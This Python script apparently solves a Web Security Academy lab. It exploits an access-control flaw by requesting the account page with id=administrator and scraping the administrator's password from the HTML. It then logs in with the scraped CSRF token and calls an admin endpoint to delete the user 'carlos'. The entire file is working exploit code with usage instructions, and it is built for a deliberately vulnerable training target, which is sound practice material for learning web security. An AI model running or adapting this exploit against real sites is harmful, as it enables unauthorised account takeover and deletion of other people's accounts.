import sys
import requests
from bs4 import BeautifulSoup



def get_password(url, session):
    response = session.get(f"{url}/my-account?id=administrator", timeout=10)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        password = soup.find("input", {"name": "password"})["value"]
        return password


def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


def login(url, session, password):
    response = session.get(f"{url}/login", timeout=10)
    csrf_token = extract_csrf_token(response)
    login_response = session.post(f"{url}/login", data={"csrf": csrf_token, "username": "administrator", "password": password}, timeout=10)
    return "Your username is: administrator" in login_response.text


def delete_user(url, session):
    response = session.get(f"{url}/admin/delete?username=carlos")
    return "User deleted successfully!" in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Getting the administrator user's password...")
        password = get_password(url, session)
        if password:
            print(f"(+) Password found! Password is: {password}")
        else:
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Logging in...")
        if not login(url, session, password):
            print("(-) Something went wrong.")
            sys.exit(1)

        print("(+) Deleting the user \"carlos\"...")
        if delete_user(url, session):
            print("(+) User successfully deleted!")
        else:
            print("(-) Something went wrong.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()
